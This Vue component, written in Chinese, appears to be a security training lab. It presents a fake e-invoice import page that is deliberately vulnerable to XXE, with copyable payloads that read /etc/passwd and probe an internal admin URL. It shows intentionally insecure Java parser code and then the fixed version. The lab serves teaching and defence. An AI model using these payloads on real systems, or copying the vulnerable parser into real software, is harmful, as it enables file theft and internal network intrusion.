<template>
  <vuln-template
    title="电子发票导入系统 - XML 读取器"
    subtitle="外部实体注入"
    level="高危"
    :icon="FileTextOutlined"
    moduleKey="xxe_xmlreader"
  >
    <template #description>
      <a-typography-paragraph>
        <strong>业务场景：</strong>企业电子发票管理系统,支持批量导入XML格式的电子发票数据。系统支持文件上传和手动输入两种方式,自动解析发票信息并存入财务系统。
      </a-typography-paragraph>
      <a-typography-paragraph>
        <strong>漏洞原理：</strong>系统使用XMLReader解析上传的发票XML文件,但未禁用外部实体解析,攻击者可以通过构造恶意XML读取服务器文件或发起SSRF攻击。
      </a-typography-paragraph>
      <a-alert
        message="⚠️ 安全提示"
        description="本系统仅用于安全学习,请勿在生产环境使用。XXE漏洞可能导致敏感信息泄露、内网探测等严重后果。"
        type="warning"
        show-icon
        style="margin-top: 12px"
      />
    </template>

    <template #payload>
      <a-tabs v-model:activeKey="payloadTab" type="card">
        <a-tab-pane key="normal" tab="正常发票">
          <a-typography-paragraph>
            <strong>正常的电子发票XML示例：</strong>
          </a-typography-paragraph>
          <a-typography-paragraph code copyable>
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;invoice&gt;
  &lt;number&gt;INV-2026-001&lt;/number&gt;
  &lt;date&gt;2026-01-14&lt;/date&gt;
  &lt;seller&gt;示例公司&lt;/seller&gt;
  &lt;amount&gt;10000.00&lt;/amount&gt;
&lt;/invoice&gt;
          </a-typography-paragraph>
        </a-tab-pane>

        <a-tab-pane key="file" tab="文件读取攻击">
          <a-typography-paragraph>
            <strong>攻击Payload - 读取/etc/passwd：</strong>
          </a-typography-paragraph>
          <a-typography-paragraph code copyable>
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE invoice [
  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
]&gt;
&lt;invoice&gt;
  &lt;number&gt;&amp;xxe;&lt;/number&gt;
&lt;/invoice&gt;
          </a-typography-paragraph>
          <a-alert
            message="攻击原理：通过DOCTYPE声明外部实体,引用本地文件系统路径,解析器会读取文件内容并返回。"
            type="info"
            show-icon
            style="margin-top: 12px"
          />
        </a-tab-pane>

        <a-tab-pane key="ssrf" tab="SSRF攻击">
          <a-typography-paragraph>
            <strong>攻击Payload - 内网探测：</strong>
          </a-typography-paragraph>
          <a-typography-paragraph code copyable>
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE invoice [
  &lt;!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin"&gt;
]&gt;
&lt;invoice&gt;
  &lt;number&gt;&amp;xxe;&lt;/number&gt;
&lt;/invoice&gt;
          </a-typography-paragraph>
          <a-alert
            message="攻击原理：通过外部实体引用内网地址,可以探测内网服务、绕过防火墙限制。"
            type="info"
            show-icon
            style="margin-top: 12px"
          />
        </a-tab-pane>
      </a-tabs>
    </template>

    <template #test-form>
      <div class="invoice-system-container">
        <!-- 系统头部 -->
        <div class="system-header">
          <div class="header-icon">
            <file-text-outlined />
          </div>
          <div class="header-content">
            <h3>电子发票批量导入系统</h3>
            <p>支持XML格式的电子发票数据导入 | 已导入 {{ importHistory.length }} 张发票</p>
          </div>
          <div class="header-stats">
            <a-statistic title="今日导入" :value="importHistory.length" suffix="张" />
          </div>
        </div>

        <!-- 快捷操作 -->
        <a-row :gutter="16" style="margin-bottom: 24px;">
          <a-col :span="6">
            <a-card class="quick-action-card" @click="loadExample('normal')">
              <div class="action-icon" style="background: linear-gradient(135deg, #52c41a 0%, #95de64 100%);">
                <check-circle-outlined />
              </div>
              <div class="action-content">
                <div class="action-title">正常发票</div>
                <div class="action-desc">加载正常发票示例</div>
              </div>
            </a-card>
          </a-col>
          <a-col :span="6">
            <a-card class="quick-action-card" @click="loadExample('file')">
              <div class="action-icon" style="background: linear-gradient(135deg, #fa8c16 0%, #ffc53d 100%);">
                <file-outlined />
              </div>
              <div class="action-content">
                <div class="action-title">文件读取</div>
                <div class="action-desc">XXE文件读取攻击</div>
              </div>
            </a-card>
          </a-col>
          <a-col :span="6">
            <a-card class="quick-action-card" @click="loadExample('ssrf')">
              <div class="action-icon" style="background: linear-gradient(135deg, #f5222d 0%, #ff7875 100%);">
                <api-outlined />
              </div>
              <div class="action-content">
                <div class="action-title">SSRF攻击</div>
                <div class="action-desc">内网服务探测</div>
              </div>
            </a-card>
          </a-col>
          <a-col :span="6">
            <a-card class="quick-action-card" @click="showHistory = !showHistory">
              <div class="action-icon" style="background: linear-gradient(135deg, #722ed1 0%, #b37feb 100%);">
                <history-outlined />
              </div>
              <div class="action-content">
                <div class="action-title">导入历史</div>
                <div class="action-desc">查看历史记录</div>
              </div>
            </a-card>
          </a-col>
        </a-row>

        <!-- 导入历史记录 -->
        <a-card v-if="showHistory" title="📜 导入历史记录" :bordered="false" class="history-card" style="margin-bottom: 24px;">
          <a-table
            :columns="historyColumns"
            :data-source="importHistory"
            :pagination="{ pageSize: 5 }"
            size="small"
          >
            <template #bodyCell="{ column, record }">
              <template v-if="column.key === 'status'">
                <a-tag :color="record.status === 'success' ? 'success' : 'error'">
                  {{ record.status === 'success' ? '成功' : '失败' }}
                </a-tag>
              </template>
              <template v-if="column.key === 'action'">
                <a-button type="link" size="small" @click="loadHistoryItem(record)">
                  查看
                </a-button>
              </template>
            </template>
          </a-table>
        </a-card>

        <!-- 导入方式选择 -->
        <a-card title="📄 发票数据导入" :bordered="false" class="import-card">
          <template #extra>
            <a-radio-group v-model:value="importMode" button-style="solid">
              <a-radio-button value="text">手动输入</a-radio-button>
              <a-radio-button value="file">文件上传</a-radio-button>
            </a-radio-group>
          </template>

          <!-- 文件上传模式 -->
          <div v-if="importMode === 'file'" class="upload-section">
            <a-upload-dragger
              :before-upload="handleFileUpload"
              :show-upload-list="false"
              accept=".xml"
            >
              <p class="ant-upload-drag-icon">
                <inbox-outlined style="font-size: 48px; color: #1890ff;" />
              </p>
              <p class="ant-upload-text">点击或拖拽XML文件到此区域上传</p>
              <p class="ant-upload-hint">
                支持单个XML文件上传,文件大小不超过10MB
              </p>
            </a-upload-dragger>
            <div v-if="uploadedFileName" class="uploaded-file-info">
              <a-alert
                :message="`已选择文件: ${uploadedFileName}`"
                type="success"
                show-icon
                closable
                @close="clearUploadedFile"
              />
            </div>
          </div>

          <!-- 手动输入模式 -->
          <a-form v-else :model="formState" @finish="handleSubmit" layout="vertical">
            <a-form-item
              label="XML内容"
              name="content"
              :rules="[{ required: true, message: '请输入XML数据' }]"
            >
              <a-textarea
                v-model:value="formState.content"
                :rows="12"
                placeholder="请粘贴或输入XML格式的发票数据..."
                class="xml-textarea"
              />
            </a-form-item>

            <!-- 数据预览 -->
            <a-form-item v-if="formState.content" label="数据预览">
              <div class="data-preview">
                <a-descriptions :column="2" size="small" bordered>
                  <a-descriptions-item label="数据大小">
                    {{ (formState.content.length / 1024).toFixed(2) }} KB
                  </a-descriptions-item>
                  <a-descriptions-item label="行数">
                    {{ formState.content.split('\n').length }} 行
                  </a-descriptions-item>
                  <a-descriptions-item label="包含DOCTYPE" :span="2">
                    <a-tag :color="formState.content.includes('<!DOCTYPE') ? 'warning' : 'success'">
                      {{ formState.content.includes('<!DOCTYPE') ? '是 ⚠️' : '否' }}
                    </a-tag>
                  </a-descriptions-item>
                </a-descriptions>
              </div>
            </a-form-item>

            <a-form-item>
              <a-space size="large">
                <a-button type="primary" html-type="submit" size="large" :loading="loading">
                  <template #icon><upload-outlined /></template>
                  导入发票
                </a-button>
                <a-button size="large" @click="handleReset">
                  <template #icon><redo-outlined /></template>
                  清空
                </a-button>
              </a-space>
            </a-form-item>
          </a-form>
        </a-card>
      </div>
    </template>

    <template #result v-if="result">
      <a-card title="📊 解析结果" :bordered="false" class="result-card">
        <div class="result-content">
          <pre>{{ result }}</pre>
        </div>
        <a-alert
          v-if="result && (result.includes('root:') || result.includes('解析结果'))"
          message="⚠️ 检测到XXE漏洞"
          description="系统成功解析了外部实体,返回了敏感文件内容。在真实环境中,这可能导致严重的信息泄露。"
          type="error"
          show-icon
          style="margin-top: 16px"
        />
      </a-card>
    </template>

    <template #source-code>
      <a-typography-paragraph>
        <strong>后端源码（存在漏洞）：</strong>
      </a-typography-paragraph>
      <div style="margin-top: 12px; position: relative;">
        <a-typography-paragraph copyable :copy-text="sourceCode" style="margin: 0;">
          <pre class="code-block"><code>@RestController
@RequestMapping("/home/xxe")
public class XXE {
    @PostMapping(value = "/xmlreader")
    public String XMLReader(@RequestBody String content, String entity) {
        try {
            // 漏洞：安全检测是可选的，默认不启用
            if (entity != null && entity.equals("true") && Security.checkXXE(content)) {
                return "检测到XXE攻击";
            }

            // 漏洞：创建XMLReader时没有禁用外部实体
            XMLReader xmlReader = XMLReaderFactory.createXMLReader();
            // 修复代码被注释掉了：
            // xmlReader.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);

            // 解析XML，如果XML包含外部实体引用，会加载外部资源
            xmlReader.setContentHandler(handler);
            xmlReader.parse(new InputSource(new StringReader(content)));

            return "解析结果: " + result.toString();
        } catch (Exception e) {
            return "错误: " + e.toString();
        }
    }
}</code></pre>
      </a-typography-paragraph>
      </div>
      <a-alert
        message="漏洞点：XMLReader默认允许加载外部实体,攻击者可以通过DOCTYPE声明和ENTITY引用加载本地文件（file://）或远程资源（http://），导致文件读取或SSRF攻击。"
        type="error"
        show-icon
        style="margin-top: 12px"
      />
    </template>

    <template #fix>
      <a-typography-paragraph>
        <strong>修复建议：</strong>
      </a-typography-paragraph>
      <ul style="padding-left: 20px; line-height: 2;">
        <li><strong>禁用DOCTYPE：</strong>设置disallow-doctype-decl特性为true，禁止DOCTYPE声明</li>
        <li><strong>禁用外部实体：</strong>设置external-general-entities和external-parameter-entities为false</li>
        <li><strong>禁用外部DTD：</strong>设置load-external-dtd为false</li>
        <li><strong>输入验证：</strong>在解析前检查XML是否包含DOCTYPE声明</li>
      </ul>

      <div style="margin-top: 16px; position: relative;">
        <a-typography-paragraph copyable :copy-text="fixCode" style="margin: 0;">
          <pre class="code-block"><code>// 正确示例：禁用DOCTYPE和外部实体
@PostMapping(value = "/xmlreader")
public String XMLReader(@RequestBody String content) {
    try {
        XMLReader xmlReader = XMLReaderFactory.createXMLReader();

        // 禁用DOCTYPE声明
        xmlReader.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);

        // 禁用外部通用实体
        xmlReader.setFeature("http://xml.org/sax/features/external-general-entities", false);

        // 禁用外部参数实体
        xmlReader.setFeature("http://xml.org/sax/features/external-parameter-entities", false);

        // 禁用外部DTD
        xmlReader.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);

        ContentHandler handler = new ContentHandler() { /* ... */ };
        xmlReader.setContentHandler(handler);
        xmlReader.parse(new InputSource(new StringReader(content)));

        return "解析结果: " + result.toString();
    } catch (Exception e) {
        return "错误: " + e.getMessage();
    }
}</code></pre>
      </a-typography-paragraph>
      </div>
    </template>
  </vuln-template>
</template>

<script setup>
import { reactive, ref } from 'vue'
import { message } from 'ant-design-vue'
import {
  FileTextOutlined,
  RedoOutlined,
  UploadOutlined,
  CheckCircleOutlined,
  FileOutlined,
  ApiOutlined,
  HistoryOutlined,
  InboxOutlined
} from '@ant-design/icons-vue'
import VulnTemplate from '@/components/VulnTemplate.vue'
import axios from 'axios'

const loading = ref(false)
const result = ref('')
const payloadTab = ref('normal')
const importMode = ref('text')
const showHistory = ref(false)
const uploadedFileName = ref('')
const importHistory = ref([])

const historyColumns = [
  { title: '时间', dataIndex: 'time', key: 'time', width: 180 },
  { title: '文件名/类型', dataIndex: 'name', key: 'name' },
  { title: '状态', dataIndex: 'status', key: 'status', width: 80 },
  { title: '操作', key: 'action', width: 80 }
]

const examples = {
  normal: `<?xml version="1.0" encoding="UTF-8"?>
<invoice>
  <number>INV-2026-001</number>
  <date>2026-01-14</date>
  <seller>示例公司</seller>
  <amount>10000.00</amount>
</invoice>`,
  file: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE invoice [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<invoice>
  <number>&xxe;</number>
</invoice>`,
  ssrf: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE invoice [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin">
]>
<invoice>
  <number>&xxe;</number>
</invoice>`
}

const sourceCode = `@RestController
@RequestMapping("/home/xxe")
public class XXE {
    @PostMapping(value = "/xmlreader")
    public String XMLReader(@RequestBody String content, String entity) {
        try {
            // 漏洞：安全检测是可选的，默认不启用
            if (entity != null && entity.equals("true") && Security.checkXXE(content)) {
                return "检测到XXE攻击";
            }

            // 漏洞：创建XMLReader时没有禁用外部实体
            XMLReader xmlReader = XMLReaderFactory.createXMLReader();
            // 修复代码被注释掉了：
            // xmlReader.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);

            // 解析XML，如果XML包含外部实体引用，会加载外部资源
            xmlReader.setContentHandler(handler);
            xmlReader.parse(new InputSource(new StringReader(content)));

            return "解析结果: " + result.toString();
        } catch (Exception e) {
            return "错误: " + e.toString();
        }
    }
}`

const fixCode = `// 正确示例：禁用DOCTYPE和外部实体
@PostMapping(value = "/xmlreader")
public String XMLReader(@RequestBody String content) {
    try {
        XMLReader xmlReader = XMLReaderFactory.createXMLReader();

        // 禁用DOCTYPE声明
        xmlReader.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);

        // 禁用外部通用实体
        xmlReader.setFeature("http://xml.org/sax/features/external-general-entities", false);

        // 禁用外部参数实体
        xmlReader.setFeature("http://xml.org/sax/features/external-parameter-entities", false);

        // 禁用外部DTD
        xmlReader.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);

        ContentHandler handler = new ContentHandler() { /* ... */ };
        xmlReader.setContentHandler(handler);
        xmlReader.parse(new InputSource(new StringReader(content)));

        return "解析结果: " + result.toString();
    } catch (Exception e) {
        return "错误: " + e.getMessage();
    }
}`

const formState = reactive({
  content: ''
})

const loadExample = (type) => {
  formState.content = examples[type]
  payloadTab.value = type
  importMode.value = 'text'
  message.success(`已加载${type === 'normal' ? '正常发票' : type === 'file' ? '文件读取攻击' : 'SSRF攻击'}示例`)
}

const handleFileUpload = (file) => {
  const isXML = file.type === 'text/xml' || file.name.endsWith('.xml')
  if (!isXML) {
    message.error('只能上传XML文件!')
    return false
  }

  const isLt10M = file.size / 1024 / 1024 < 10
  if (!isLt10M) {
    message.error('文件大小不能超过10MB!')
    return false
  }

  uploadedFileName.value = file.name

  const reader = new FileReader()
  reader.onload = (e) => {
    formState.content = e.target.result
    message.success('文件读取成功,请点击导入按钮')
    // 自动提交
    setTimeout(() => {
      handleSubmit()
    }, 500)
  }
  reader.readAsText(file)

  return false
}

const clearUploadedFile = () => {
  uploadedFileName.value = ''
  formState.content = ''
}

const handleSubmit = async () => {
  if (!formState.content) {
    message.error('请先选择文件或输入XML内容')
    return
  }

  loading.value = true
  const startTime = new Date()

  try {
    const response = await axios.post('/home/xxe/xmlreader', formState.content, {
      headers: {
        'Content-Type': 'application/xml'
      }
    })
    result.value = response.data

    // 添加到历史记录
    importHistory.value.unshift({
      key: Date.now(),
      time: new Date().toLocaleString('zh-CN'),
      name: uploadedFileName.value || '手动输入',
      status: 'success',
      content: formState.content,
      result: response.data
    })

    message.success('导入完成')
  } catch (error) {
    const errorMsg = error.response?.data || error.message
    result.value = typeof errorMsg === 'string' ? errorMsg : JSON.stringify(errorMsg)

    // 添加失败记录
    importHistory.value.unshift({
      key: Date.now(),
      time: new Date().toLocaleString('zh-CN'),
      name: uploadedFileName.value || '手动输入',
      status: 'error',
      content: formState.content,
      result: result.value
    })

    message.error('导入失败')
  } finally {
    loading.value = false
  }
}

const loadHistoryItem = (record) => {
  formState.content = record.content
  result.value = record.result
  importMode.value = 'text'
  showHistory.value = false
  message.info('已加载历史记录')
}

const handleReset = () => {
  formState.content = ''
  result.value = ''
  uploadedFileName.value = ''
}
</script>

<style scoped>
.invoice-system-container {
  width: 100%;
}

.system-header {
  display: flex;
  align-items: center;
  padding: 32px;
  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
  border-radius: 16px;
  color: white;
  margin-bottom: 24px;
  box-shadow: 0 8px 32px rgba(102, 126, 234, 0.3);
}

.header-icon {
  width: 80px;
  height: 80px;
  background: rgba(255, 255, 255, 0.2);
  backdrop-filter: blur(10px);
  border-radius: 16px;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 40px;
  margin-right: 24px;
}

.header-content {
  flex: 1;
}

.header-content h3 {
  margin: 0 0 8px 0;
  font-size: 28px;
  font-weight: 700;
  color: white;
}

.header-content p {
  margin: 0;
  font-size: 16px;
  opacity: 0.9;
}

.header-stats {
  margin-left: 24px;
}

.header-stats :deep(.ant-statistic-title) {
  color: rgba(255, 255, 255, 0.85);
}

.header-stats :deep(.ant-statistic-content) {
  color: white;
  font-size: 24px;
}

.quick-action-card {
  cursor: pointer;
  transition: all 0.3s ease;
  border-radius: 12px;
}

.quick-action-card:hover {
  transform: translateY(-4px);
  box-shadow: 0 8px 24px rgba(0, 0, 0, 0.12);
}

.quick-action-card :deep(.ant-card-body) {
  padding: 20px;
  display: flex;
  align-items: center;
  gap: 16px;
}

.action-icon {
  width: 56px;
  height: 56px;
  border-radius: 12px;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 28px;
  color: white;
  flex-shrink: 0;
}

.action-content {
  flex: 1;
}

.action-title {
  font-size: 16px;
  font-weight: 600;
  color: #2c3e50;
  margin-bottom: 4px;
}

.action-desc {
  font-size: 13px;
  color: #95a5a6;
}

.history-card {
  border-radius: 12px;
  box-shadow: 0 4px 16px rgba(0, 0, 0, 0.08);
  animation: slideDown 0.3s ease;
}

@keyframes slideDown {
  from {
    opacity: 0;
    transform: translateY(-10px);
  }
  to {
    opacity: 1;
    transform: translateY(0);
  }
}

.import-card {
  border-radius: 12px;
  box-shadow: 0 4px 16px rgba(0, 0, 0, 0.08);
}

.import-card :deep(.ant-card-head) {
  background: linear-gradient(135deg, #f6f9ff 0%, #f0f5ff 100%);
  border-bottom: 2px solid #e6f7ff;
  font-weight: 600;
}

.upload-section {
  padding: 20px 0;
}

.uploaded-file-info {
  margin-top: 16px;
}

.data-preview {
  margin-top: 12px;
}

.xml-textarea {
  font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
  font-size: 13px;
  line-height: 1.6;
}

.result-card {
  border-radius: 12px;
  box-shadow: 0 4px 16px rgba(0, 0, 0, 0.08);
  margin-top: 24px;
}

.result-card :deep(.ant-card-head) {
  background: linear-gradient(135deg, #fff7e6 0%, #fffbe6 100%);
  border-bottom: 2px solid #ffe58f;
  font-weight: 600;
}

.result-content {
  background: #f6f8fa;
  border-radius: 8px;
  padding: 16px;
  border: 1px solid #e1e4e8;
}

.result-content pre {
  margin: 0;
  font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
  font-size: 13px;
  line-height: 1.6;
  color: #24292e;
  white-space: pre-wrap;
  word-wrap: break-word;
}
</style>
